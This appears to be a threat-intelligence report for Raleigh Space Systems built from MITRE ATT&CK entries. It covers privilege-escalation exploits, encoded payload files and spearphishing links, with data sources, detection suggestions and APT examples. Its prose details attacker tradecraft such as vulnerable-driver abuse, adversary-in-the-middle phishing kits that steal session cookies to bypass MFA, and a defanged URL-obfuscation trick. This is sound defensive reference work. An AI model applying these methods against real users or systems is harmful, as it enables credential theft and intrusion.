### [Exploitation for Privilege Escalation (T1068)](https://attack.mitre.org/techniques/T1068)
#### Score: 15
#### Description:
Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.

When initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.

Adversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020) Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) or [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570).
#### Raleigh Space Systems Analysis: 
### Data Sources:
- Driver: Driver Load
- Process: Process Creation
### Detection Suggestions:
Detecting software exploitation may be difficult depending on the tools available. Software exploits may not always succeed or may cause the exploited process to become unstable or crash. Also look for behavior on the endpoint system that might indicate successful compromise, such as abnormal behavior of the processes. This could include suspicious files written to disk, evidence of [Process Injection](https://attack.mitre.org/techniques/T1055) for attempts to hide execution or evidence of Discovery. Consider monitoring for the presence or loading (ex: Sysmon Event ID 6) of known vulnerable drivers that adversaries may drop and exploit to execute code in kernel mode.(Citation: Microsoft Driver Block Rules)

Higher privileges are often necessary to perform additional actions such as some methods of [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). Look for additional activity that may indicate an adversary has gained higher privileges.
#### Examples: 
- APT28 has exploited CVE-2014-4076, CVE-2015-2387, CVE-2015-1701, CVE-2017-0263, and CVE-2022-38028 to escalate privileges.[[1]](https://download.bitdefender.com/resources/media/materials/white-papers/en/Bitdefender_In-depth_analysis_of_APT28%E2%80%93The_Political_Cyber-Espionage.pdf)[[2]](http://download.microsoft.com/download/4/4/C/44CDEF0E-7924-4787-A56A-16261691ACE3/Microsoft_Security_Intelligence_Report_Volume_19_English.pdf)[[3]](https://securelist.com/a-slice-of-2017-sofacy-activity/83930/)[[4]](https://www.volexity.com/blog/2024/11/22/the-nearest-neighbor-attack-how-a-russian-apt-weaponized-nearby-wi-fi-networks-for-covert-access/)
- APT33 has used a publicly available exploit for CVE-2017-0213 to escalate privileges on a local system.[[5]](https://www.fireeye.com/blog/threat-research/2018/12/overruled-containing-a-potentially-destructive-adversary.html)
- Volt Typhoon has gained initial access by exploiting privilege escalation vulnerabilities in the operating system or network services.[[6]](https://www.cisa.gov/sites/default/files/2024-03/aa24-038a_csa_prc_state_sponsored_actors_compromise_us_critical_infrastructure_3.pdf)
### [Obfuscated Files or Information: Encrypted/Encoded File (T1027.013)](https://attack.mitre.org/techniques/T1027/013)
#### Score: 15
#### Description:
Adversaries may encrypt or encode files to obfuscate strings, bytes, and other specific patterns to impede detection. Encrypting and/or encoding file content aims to conceal malicious artifacts within a file used in an intrusion. Many other techniques, such as [Software Packing](https://attack.mitre.org/techniques/T1027/002), [Steganography](https://attack.mitre.org/techniques/T1027/003), and [Embedded Payloads](https://attack.mitre.org/techniques/T1027/009), share this same broad objective. Encrypting and/or encoding files could lead to a lapse in detection of static signatures, only for this malicious content to be revealed (i.e., [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140)) at the time of execution/use.

This type of file obfuscation can be applied to many file artifacts present on victim hosts, such as malware log/configuration and payload files.(Citation: File obfuscation) Files can be encrypted with a hardcoded or user-supplied key, as well as otherwise obfuscated using standard encoding schemes such as Base64.

The entire content of a file may be obfuscated, or just specific functions or values (such as C2 addresses). Encryption and encoding may also be applied in redundant layers for additional protection.

For example, adversaries may abuse password-protected Word documents or self-extracting (SFX) archives as a method of encrypting/encoding a file such as a [Phishing](https://attack.mitre.org/techniques/T1566) payload. These files typically function by attaching the intended archived content to a decompressor stub that is executed when the file is invoked (e.g., [User Execution](https://attack.mitre.org/techniques/T1204)).(Citation: SFX - Encrypted/Encoded File) 

Adversaries may also abuse file-specific as well as custom encoding schemes. For example, Byte Order Mark (BOM) headers in text files may be abused to manipulate and obfuscate file content until [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) execution.
#### Raleigh Space Systems Analysis: 
### Data Sources:
- File: File Creation
- File: File Metadata
### Detection Suggestions:

#### Examples: 
- APT28 encrypted a .dll payload using RTL and a custom encryption algorithm. APT28 has also obfuscated payloads with base64, XOR, and RC4.[[1]](https://download.bitdefender.com/resources/media/materials/white-papers/en/Bitdefender_In-depth_analysis_of_APT28%E2%80%93The_Political_Cyber-Espionage.pdf)[[2]](https://researchcenter.paloaltonetworks.com/2018/02/unit42-sofacy-attacks-multiple-government-entities/)[[3]](https://researchcenter.paloaltonetworks.com/2018/06/unit42-sofacy-groups-parallel-attacks/)[[4]](https://blog.talosintelligence.com/2017/10/cyber-conflict-decoy-document.html)[[5]](https://www.accenture.com/t20181129T203820Z__w__/us-en/_acnmedia/PDF-90/Accenture-snakemackerel-delivers-zekapab-malware.pdf#zoom=50)
- APT33 has used base64 to encode payloads.[[6]](https://www.fireeye.com/blog/threat-research/2018/12/overruled-containing-a-potentially-destructive-adversary.html)
- Lazarus Group has used multiple types of encryption and encoding for their payloads, including AES, Caracachs, RC4, XOR, Base64, and other tricks such as creating aliases in code for Native API function names.[[7]](https://web.archive.org/web/20160226161828/https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Report.pdf)[[8]](https://web.archive.org/web/20190508165631/https://operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Loaders-Installers-and-Uninstallers-Report.pdf)[[9]](https://web.archive.org/web/20220608001455/https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-RAT-and-Staging-Report.pdf)[[10]](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/lazarus-resurfaces-targets-global-banks-bitcoin-users/)[[11]](https://blog.trendmicro.com/trendlabs-security-intelligence/new-macos-dacls-rat-backdoor-show-lazarus-multi-platform-attack-capability/)[[12]](https://blog.malwarebytes.com/threat-intelligence/2022/01/north-koreas-lazarus-apt-leverages-windows-update-client-github-in-latest-campaign/)[[13]](https://blog.qualys.com/vulnerabilities-threat-research/2022/02/08/lolzarus-lazarus-group-incorporating-lolbins-into-campaigns)
- menuPass has encoded strings in its malware with base64 as well as with a simple, single-byte XOR obfuscation using key 0x40.[[14]](http://web.archive.org/web/20220810112638/https:/www.accenture.com/t20180423T055005Z_w_/se-en/_acnmedia/PDF-76/Accenture-Hogfish-Threat-Analysis.pdf)[[15]](https://www.fireeye.com/blog/threat-research/2018/09/apt10-targeting-japanese-corporations-using-updated-ttps.html)[[16]](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-japan-espionage)
### [Phishing for Information: Spearphishing Link (T1598.003)](https://attack.mitre.org/techniques/T1598/003)
#### Score: 15
#### Description:
Adversaries may send spearphishing messages with a malicious link to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages.

All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, the malicious emails contain links generally accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser.(Citation: TrendMictro Phishing)(Citation: PCMag FakeLogin) The given website may be a clone of a legitimate site (such as an online or corporate login portal) or may closely resemble a legitimate site in appearance and have a URL containing elements from the real site. URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an “@” symbol: for example, `hxxp://google.com@1157586937`.(Citation: Mandiant URL Obfuscation 2023)

Adversaries may also embed “tracking pixels”, "web bugs", or "web beacons" within phishing messages to verify the receipt of an email, while also potentially profiling and tracking victim information such as IP address.(Citation: NIST Web Bug) (Citation: Ryte Wiki) These mechanisms often appear as small images (typically one pixel in size) or otherwise obfuscated objects and are typically delivered as HTML code containing a link to a remote server. (Citation: Ryte Wiki)(Citation: IAPP)

Adversaries may also be able to spoof a complete website using what is known as a "browser-in-the-browser" (BitB) attack. By generating a fake browser popup window with an HTML-based address bar that appears to contain a legitimate URL (such as an authentication portal), they may be able to prompt users to enter their credentials while bypassing typical URL verification methods.(Citation: ZScaler BitB 2020)(Citation: Mr. D0x BitB 2022)

Adversaries can use phishing kits such as `EvilProxy` and `Evilginx2` to perform adversary-in-the-middle phishing by proxying the connection between the victim and the legitimate website. On a successful login, the victim is redirected to the legitimate website, while the adversary captures their session cookie (i.e., [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)) in addition to their username and password. This may enable the adversary to then bypass MFA via [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004).(Citation: Proofpoint Human Factor)

Adversaries may also send a malicious link in the form of Quick Response (QR) Codes (also known as “quishing”). These links may direct a victim to a credential phishing page.(Citation: QR-campaign-energy-firm) By using a QR code, the URL may not be exposed in the email and may thus go undetected by most automated email security scans.(Citation: qr-phish-agriculture) These QR codes may be scanned by or delivered directly  to a user’s mobile device (i.e., [Phishing](https://attack.mitre.org/techniques/T1660)), which may be less secure in several relevant ways.(Citation: qr-phish-agriculture) For example, mobile users may not be able to notice minor differences between genuine and credential harvesting websites due to mobile’s smaller form factor.

From the fake website, information is gathered in web forms and sent to the adversary. Adversaries may also use information from previous reconnaissance efforts (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to craft persuasive and believable lures.
#### Raleigh Space Systems Analysis: 
### Data Sources:
- Application Log: Application Log Content
- Network Traffic: Network Traffic Flow
- Network Traffic: Network Traffic Content
### Detection Suggestions:
Monitor for suspicious email activity, such as numerous accounts receiving messages from a single unusual/unknown sender. Filtering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed.(Citation: Microsoft Anti Spoofing)(Citation: ACSC Email Spoofing)

Monitor for references to uncategorized or known-bad sites. URL inspection within email (including expanding shortened links) can also help detect links leading to known malicious sites.
#### Examples: 
- APT28 has conducted credential phishing campaigns with links that redirect to credential harvesting sites.[[1]](https://blog.google/threat-analysis-group/update-threat-landscape-ukraine)[[2]](https://cdn.cnn.com/cnn/2018/images/07/13/gru.indictment.pdf)[[3]](https://www.welivesecurity.com/2019/05/22/journey-zebrocy-land/)[[4]](https://www.justice.gov/opa/page/file/1098481/download)[[5]](https://www.secureworks.com/research/iron-twilight-supports-active-measures)

[TLP](https://www.first.org/tlp/): Amber+Strict
